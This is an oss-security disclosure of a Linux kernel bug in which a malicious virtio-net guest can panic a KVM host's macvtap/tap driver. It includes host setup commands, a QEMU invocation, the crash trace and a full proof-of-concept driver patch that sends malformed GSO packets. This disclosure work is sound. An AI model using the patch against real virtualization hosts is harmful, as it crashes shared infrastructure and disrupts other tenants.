X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/12/20
Message-ID: <92e5191f-25ac-4869-b641-27a10b45b4f5@oracle.com>
Date: Wed, 12 Aug 2026 10:01:50 -0700
From: Dongli Zhang <dongli.zhang@...cle.com>
To: oss-security@...ts.openwall.com
Subject: Linux kernel: Guest-to-Host DoS via TAP
Content-Type: text/plain; charset=utf-8

Hi,

This report describes a Denial of Service (DoS) vulnerability where a guest VM
using the virtio-net driver can intentionally trigger a host panic when the
host uses a tap device, such as macvtap, as the vhost-net backend.

VM (virtio-net) -- Host (vhost-net) -- Host (macvtap)

This is only one example scenario. Other tap device users may also be able to
send malformed packets that cause the tap driver to panic.

This vulnerability is related to CVE-2022-50073. The fix for that CVE addressed
the tap_get_user() path, but missed the tap_get_user_xdp() path.

The fix has already been merged into the mainline tree in the commit below.

net: tap: set skb->dev before parsing virtio net header in tap_get_user_xdp()
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3874892dd27d5387aa9a06f58d9060f18f351d24

So far, no CVE has been assigned by the Linux kernel CNA.

Thank you very much!

Dongli Zhang

-------------------

Below is the exploit flow I used to trigger the DoS.

1. Use either a baremetal or VM-based Linux OS as the KVM host. QEMU is then
used to create a guest VM with the virtio-net driver.

The example below uses Linux v7.2-rc6 for both KVM host and guest.

2. Apply the patch appended at the end of this report to the guest kernel, then
build the guest kernel with the virtio-net driver enabled as built-in
(CONFIG_VIRTIO_NET=y).

3. Create a dummy network device, then create a macvtap device on top of it.
Use the macvtap device as the vhost-net backend.

host# modprobe dummy
host# ip link add dummy0 type dummy
RTNETLINK answers: File exists
host# ip link set dummy0 up
host# ip link add link dummy0 name macvtap0 numtxqueues 4 numrxqueues 4 type macvtap mode passthru
host# ip link set macvtap0 up
host# cat /sys/class/net/macvtap0/ifindex
6

4. Boot the guest kernel with QEMU. boot.img is a legacy sda-style image
without LVM. Suppose ifindex is 6.

/usr/libexec/qemu-kvm \
-machine q35,kernel_irqchip=split,dump-guest-core=off \
-accel kvm -cpu host \
-name debug-threads=on \
-m 8G -smp 4 \
-vnc :9 -serial stdio \
-hda boot.img \
-kernel mainline-linux/arch/x86_64/boot/bzImage \
-append "root=/dev/sda1 init=/sbin/init text loglevel=7 console=ttyS0 virtio_net.debug=1 virtio_net.xdp=1" \
-device virtio-net-pci,netdev=tapnet,mq=true,vectors=3 \
-netdev tap,id=tapnet,fds=37,vhost=on \
37<>/dev/tap6 \
-no-shutdown

KVM host macvtap driver panics immediately after guest VM bootup due to the
malicious virtio-net driver.

[ 224.305730] BUG: kernel NULL pointer dereference, address: 0000000000000010
[ 224.307029] #PF: supervisor read access in kernel mode
[ 224.307304] #PF: error_code(0x0000) - not-present page
[ 224.307581] PGD 107395067 P4D 0
[ 224.307763] Oops: Oops: 0000 [#1] SMP NOPTI
[ 224.307994] CPU: 18 UID: 0 PID: 4992 Comm: vhost-4978 Not tainted 7.2.0-rc6diagnostic-g075b74841bd0-dirty #1 PREEMPT(lazy)
[ 224.308584] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.6.4 02/27/2023
[ 224.309018] RIP: 0010:__virtio_net_hdr_to_skb.constprop.0+0x41d/0x510 [tap]
... ...
[ 224.310362] RSP: 0018:ff72f102c5007c68 EFLAGS: 00010246
[ 224.310646] RAX: 0000000000000000 RBX: ff4a5a3143339c00 RCX: 0000000000000014
[ 224.311017] RDX: 0000000000000001 RSI: ff4a5a31c1500000 RDI: ff4a5a3143339c00
[ 224.311386] RBP: ff4a5a31c1500000 R08: 000000000000001c R09: 0000000000000002
[ 224.311763] R10: ff4a5a31c1500c1e R11: ff4a5a31c1500074 R12: 0000000000000001
[ 224.312170] R13: 0000000000000001 R14: 0000000000000014 R15: 0000000000000006
[ 224.312551] FS: 00007f5271a78f40(0000) GS:ff4a5a6050788000(0000) knlGS:0000000000000000
[ 224.312972] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 224.313272] CR2: 0000000000000010 CR3: 00000001589f2003 CR4: 0000000000771ef0
[ 224.313650] PKRU: 55555554
[ 224.313803] Call Trace:
[ 224.313941] <TASK>
[ 224.314062] tap_sendmsg+0x1f3/0x13e0 [tap]
[ 224.314285] vhost_tx_batch.constprop.0+0xee/0x280 [vhost_net]
[ 224.314605] handle_tx_copy+0x3d5/0x5a0 [vhost_net]
[ 224.314871] handle_tx+0xb1/0xc0 [vhost_net]
[ 224.315103] vhost_run_work_list+0x46/0x70 [vhost]
[ 224.315360] vhost_task_fn+0x63/0xe0
[ 224.315553] ? srso_alias_return_thunk+0x5/0xfbef5
[ 224.315825] ? finish_task_switch.isra.0+0xb8/0x370
[ 224.316091] ? __pfx_vhost_task_fn+0x10/0x10
[ 224.316327] ? __pfx_vhost_task_fn+0x10/0x10
[ 224.316560] ret_from_fork+0x1ff/0x270
[ 224.316772] ? __pfx_vhost_task_fn+0x10/0x10
[ 224.317006] ret_from_fork_asm+0x1a/0x30


This PoC is applied to the virtio-net driver on top of v7.2-rc6.

diff --git a/drivers/net/virtio_net.c b/drivers/net/virtio_net.c
index 3e2a5876c6c8..20a634d44af4 100644
--- a/drivers/net/virtio_net.c
+++ b/drivers/net/virtio_net.c
@@ -20,6 +20,7 @@
 #include <linux/filter.h>
 #include <linux/kernel.h>
 #include <linux/dim.h>
+#include <net/ip.h>
 #include <net/route.h>
 #include <net/xdp.h>
 #include <net/net_failover.h>
@@ -32,9 +33,14 @@ static int napi_weight = NAPI_POLL_WEIGHT;
 module_param(napi_weight, int, 0444);

 static bool csum = true, gso = true, napi_tx = true;
+static int debug, xdp;
 module_param(csum, bool, 0444);
 module_param(gso, bool, 0444);
 module_param(napi_tx, bool, 0644);
+module_param(debug, int, 0600);
+module_param(xdp, int, 0600);
+MODULE_PARM_DESC(debug, "Send test GSO packets with ethertype 0 every 100 ms");
+MODULE_PARM_DESC(xdp, "Use small debug TX packets that fit vhost XDP batching");

 #define VIRTIO_OFFLOAD_MAP_MIN	46
 #define VIRTIO_OFFLOAD_MAP_MAX	47
@@ -441,6 +447,9 @@ struct virtnet_info {
 	/* Work struct for setting rx mode */
 	struct work_struct rx_mode_work;

+	/* Work struct for injecting debug TX packets */
+	struct delayed_work debug_tx_work;
+
 	/* OK to queue work setting RX mode? */
 	bool rx_mode_work_enabled;

@@ -2864,6 +2873,99 @@ static void virtnet_napi_disable(struct receive_queue *rq)
 	napi_disable(napi);
 }

+#define VIRTNET_DEBUG_TX_INTERVAL	msecs_to_jiffies(100)
+#define VIRTNET_DEBUG_TX_GSO_SIZE	1460
+#define VIRTNET_DEBUG_TX_PAYLOAD \
+	(READ_ONCE(xdp) ? (VIRTNET_DEBUG_TX_GSO_SIZE * 2) : (16 * 1024))
+
+static void virtnet_debug_tx_queue(struct virtnet_info *vi)
+{
+	if (READ_ONCE(debug) && netif_running(vi->dev))
+		schedule_delayed_work(&vi->debug_tx_work,
+				   VIRTNET_DEBUG_TX_INTERVAL);
+}
+
+static struct sk_buff *virtnet_debug_build_skb(struct net_device *dev)
+{
+	const unsigned int ip_len = sizeof(struct iphdr);
+	const unsigned int tcp_len = sizeof(struct tcphdr);
+	const unsigned int payload_len = VIRTNET_DEBUG_TX_PAYLOAD;
+	const unsigned int len = ETH_HLEN + ip_len + tcp_len + payload_len;
+	struct skb_shared_info *shinfo;
+	struct sk_buff *skb;
+	struct ethhdr *eth;
+	struct tcphdr *tcp;
+	struct iphdr *iph;
+	void *payload;
+
+	skb = netdev_alloc_skb_ip_align(dev, len);
+	if (!skb)
+		return NULL;
+
+	skb_reset_mac_header(skb);
+	eth = skb_put(skb, ETH_HLEN);
+	eth_broadcast_addr(eth->h_dest);
+	ether_addr_copy(eth->h_source, dev->dev_addr);
+	eth->h_proto = 0;
+
+	skb_set_network_header(skb, ETH_HLEN);
+	iph = skb_put_zero(skb, ip_len);
+	iph->version = 4;
+	iph->ihl = ip_len / 4;
+	iph->tot_len = htons(ip_len + tcp_len + payload_len);
+	iph->id = htons(0x1234);
+	iph->frag_off = htons(IP_DF);
+	iph->ttl = 64;
+	iph->protocol = IPPROTO_TCP;
+	iph->saddr = htonl(0x0a000002);
+	iph->daddr = htonl(0x0a000001);
+	iph->check = ip_fast_csum((u8 *)iph, iph->ihl);
+
+	skb_set_transport_header(skb, ETH_HLEN + ip_len);
+	tcp = skb_put_zero(skb, tcp_len);
+	tcp->source = htons(12345);
+	tcp->dest = htons(9);
+	tcp->seq = htonl(1);
+	tcp->doff = tcp_len / 4;
+	tcp->ack = 1;
+
+	payload = skb_put(skb, payload_len);
+	memset(payload, 0xa5, payload_len);
+
+	skb->dev = dev;
+	skb->protocol = eth->h_proto;
+	skb->ip_summed = CHECKSUM_UNNECESSARY;
+
+	shinfo = skb_shinfo(skb);
+	shinfo->gso_size = VIRTNET_DEBUG_TX_GSO_SIZE;
+	shinfo->gso_type = SKB_GSO_TCPV4;
+	shinfo->gso_segs = 0;
+
+	return skb;
+}
+
+static void virtnet_debug_tx_work(struct work_struct *work)
+{
+	struct virtnet_info *vi =
+		container_of(to_delayed_work(work), struct virtnet_info,
+			   debug_tx_work);
+	struct net_device *dev = vi->dev;
+	struct sk_buff *skb;
+
+	if (!READ_ONCE(debug) || !netif_running(dev))
+		return;
+
+	if (!(dev->features & NETIF_F_TSO))
+		goto out;
+
+	skb = virtnet_debug_build_skb(dev);
+	if (skb)
+		dev_queue_xmit(skb);
+
+out:
+	virtnet_debug_tx_queue(vi);
+}
+
 static int virtnet_receive_xsk_bufs(struct virtnet_info *vi,
 				  struct receive_queue *rq,
 				  int budget,
@@ -3209,6 +3311,8 @@ static int virtnet_open(struct net_device *dev)
 		netif_carrier_on(dev);
 	}

+	virtnet_debug_tx_queue(vi);
+
 	return 0;

 err_enable_qp:
@@ -3796,6 +3900,7 @@ static int virtnet_close(struct net_device *dev)
 	 * open
 	 */
 	cancel_work_sync(&vi->config_work);
+	cancel_delayed_work_sync(&vi->debug_tx_work);

 	for (i = 0; i < vi->max_queue_pairs; i++) {
 		virtnet_disable_queue_pair(vi, i);
@@ -6855,6 +6960,7 @@ static int virtnet_probe(struct virtio_device *vdev)

 	INIT_WORK(&vi->config_work, virtnet_config_changed_work);
 	INIT_WORK(&vi->rx_mode_work, virtnet_rx_mode_work);
+	INIT_DELAYED_WORK(&vi->debug_tx_work, virtnet_debug_tx_work);

 	if (virtio_has_feature(vdev, VIRTIO_NET_F_MRG_RXBUF)) {
 		vi->mergeable_rx_bufs = true;
@@ -7169,6 +7275,7 @@ static void virtnet_remove(struct virtio_device *vdev)

 	/* Make sure no work handler is accessing the device. */
 	flush_work(&vi->config_work);
+	cancel_delayed_work_sync(&vi->debug_tx_work);
 	disable_rx_mode_work(vi);
 	flush_work(&vi->rx_mode_work);
